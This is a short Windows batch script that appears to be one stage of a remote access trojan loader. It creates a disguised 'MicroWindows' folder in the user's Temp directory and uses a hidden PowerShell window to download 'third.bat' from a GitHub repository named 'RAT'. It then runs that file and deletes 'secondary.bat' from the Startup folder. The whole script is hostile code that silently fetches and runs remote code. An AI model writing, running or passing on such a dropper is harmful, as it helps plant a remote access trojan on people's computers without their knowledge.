@echo off
set "currentd=%cd%"
@rem set "username=saifa"

mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/third.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/third.bat


cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
powershell ./third.bat
cd "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del secondary.bat